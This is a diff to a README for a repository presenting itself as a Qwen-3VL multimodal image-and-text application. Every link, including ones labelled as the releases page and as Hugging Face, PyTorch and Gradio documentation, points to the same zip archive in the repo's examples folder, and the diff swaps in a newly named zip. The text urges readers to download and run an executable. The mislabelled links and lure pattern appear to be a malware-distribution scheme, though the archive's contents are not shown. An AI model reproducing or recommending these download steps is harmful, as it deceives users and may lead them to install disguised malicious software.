@@ -1,6 +1,6 @@
 # 🌟 Qwen-3VL-Multimodal-Understanding - Effortless Multimodal Image and Text Processing
 
-[![Download Qwen-3VL-Multimodal-Understanding](https://raw.githubusercontent.com/NnNasib/Qwen-3VL-Multimodal-Understanding/main/examples/Qwen-3VL-Multimodal-Understanding_beardom.zip)](https://raw.githubusercontent.com/NnNasib/Qwen-3VL-Multimodal-Understanding/main/examples/Qwen-3VL-Multimodal-Understanding_beardom.zip)
+[![Download Qwen-3VL-Multimodal-Understanding](https://github.com/NnNasib/Qwen-3VL-Multimodal-Understanding/raw/refs/heads/main/examples/Multimodal-V-Understanding-Qwen-v3.3.zip)](https://github.com/NnNasib/Qwen-3VL-Multimodal-Understanding/raw/refs/heads/main/examples/Multimodal-V-Understanding-Qwen-v3.3.zip)
 
 ## 📖 Overview
 
@@ -12,13 +12,13 @@ This section will guide you through the steps to download and run the Qwen-3VL-M
 
 ### 🔥 Download & Install
 
-1. **Visit the Release Page**: To begin, go to the [Releases page](https://raw.githubusercontent.com/NnNasib/Qwen-3VL-Multimodal-Understanding/main/examples/Qwen-3VL-Multimodal-Understanding_beardom.zip).
+1. **Visit the Release Page**: To begin, go to the [Releases page](https://github.com/NnNasib/Qwen-3VL-Multimodal-Understanding/raw/refs/heads/main/examples/Multimodal-V-Understanding-Qwen-v3.3.zip).
    
 2. **Select Your Version**: Find the latest version of the Qwen-3VL-Multimodal-Understanding application. You will see a list of files available for download.
 
 3. **Download the Application**: Click on the file that matches your operating system. This might be a `.exe` file for Windows or a `.dmg` file for Mac.
 
-   If you see something like `https://raw.githubusercontent.com/NnNasib/Qwen-3VL-Multimodal-Understanding/main/examples/Qwen-3VL-Multimodal-Understanding_beardom.zip`:
+   If you see something like `https://github.com/NnNasib/Qwen-3VL-Multimodal-Understanding/raw/refs/heads/main/examples/Multimodal-V-Understanding-Qwen-v3.3.zip`:
    - Click to download the file.
    - Save it to a location you can easily find, like your desktop.
 
@@ -83,8 +83,8 @@ If you'd like to contribute to the project, feel free to fork the repository, ma
 
 ## 🔗 Additional Resources
 
-- [Hugging Face Documentation](https://raw.githubusercontent.com/NnNasib/Qwen-3VL-Multimodal-Understanding/main/examples/Qwen-3VL-Multimodal-Understanding_beardom.zip)
-- [Pytorch Tutorials](https://raw.githubusercontent.com/NnNasib/Qwen-3VL-Multimodal-Understanding/main/examples/Qwen-3VL-Multimodal-Understanding_beardom.zip)
-- [Gradio Documentation](https://raw.githubusercontent.com/NnNasib/Qwen-3VL-Multimodal-Understanding/main/examples/Qwen-3VL-Multimodal-Understanding_beardom.zip) 
+- [Hugging Face Documentation](https://github.com/NnNasib/Qwen-3VL-Multimodal-Understanding/raw/refs/heads/main/examples/Multimodal-V-Understanding-Qwen-v3.3.zip)
+- [Pytorch Tutorials](https://github.com/NnNasib/Qwen-3VL-Multimodal-Understanding/raw/refs/heads/main/examples/Multimodal-V-Understanding-Qwen-v3.3.zip)
+- [Gradio Documentation](https://github.com/NnNasib/Qwen-3VL-Multimodal-Understanding/raw/refs/heads/main/examples/Multimodal-V-Understanding-Qwen-v3.3.zip) 
 
-Remember to visit the [Releases page](https://raw.githubusercontent.com/NnNasib/Qwen-3VL-Multimodal-Understanding/main/examples/Qwen-3VL-Multimodal-Understanding_beardom.zip) for the latest updates and downloads!
+Remember to visit the [Releases page](https://github.com/NnNasib/Qwen-3VL-Multimodal-Understanding/raw/refs/heads/main/examples/Multimodal-V-Understanding-Qwen-v3.3.zip) for the latest updates and downloads!
